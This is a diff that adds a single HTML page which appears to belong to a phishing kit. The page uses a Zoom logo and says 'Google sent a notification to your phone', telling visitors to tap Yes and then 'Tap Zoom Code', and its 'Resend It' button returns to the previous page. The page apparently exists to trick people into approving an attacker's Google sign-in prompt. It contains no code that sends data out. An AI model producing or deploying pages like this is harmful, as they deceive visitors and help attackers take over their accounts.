@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>One Time Pass Code</title>
+
+  <link rel="icon" type="image/png" href="/Zoom-Logo.png" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 30px 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    /* Top Logo */
+    .logo {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      margin-bottom: 15px;
+      border-radius: 50%;
+    }
+
+    /* Main Title */
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 25px;
+    }
+
+    /* Phone Graphic Illustration */
+    .phone-illustration {
+      width: 160px;
+      height: auto;
+      margin-bottom: 25px;
+    }
+
+    /* Sub Heading */
+    h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+
+    /* Description Text */
+    .desc-text {
+      font-size: 15px;
+      color: #333333;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .desc-text span {
+      font-weight: bold;
+      color: #111111;
+    }
+
+    /* Try Again / Checkbox Option */
+    .try-again-container {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 10px;
+      margin-bottom: 30px;
+      font-size: 15px;
+      color: #333;
+      cursor: pointer;
+    }
+
+    .try-again-container input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+      accent-color: #007aff;
+    }
+
+    /* Resend/Action Button (আপনার আগের বাটনটি এখানে রাখা হয়েছে) */
+    .btn-join {
+      background-color: #007aff;
+      color: white;
+      padding: 14px 0;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-join:hover {
+      background-color: #005ec4;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img class="logo" src="/logo.png" alt="Logo">
+
+    <h1>One Time Pass Code.</h1>
+
+    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
+
+    <h2>Check your phone.</h2>
+
+    <p class="desc-text">
+      Google sent a notification to your phone.<br>
+      <span>Tap Yes</span> on the notification<br>
+      Then Tap Zoom Code
+    </p>
+
+    <label class="try-again-container">
+      <input type="checkbox" id="tryAgainCheck">
+      <span>Try again.</span>
+    </label>
+
+    <button class="btn-join" onclick="window.location.href='../'">Resend It</button>
+  </div>
+
+</body>
+</html>
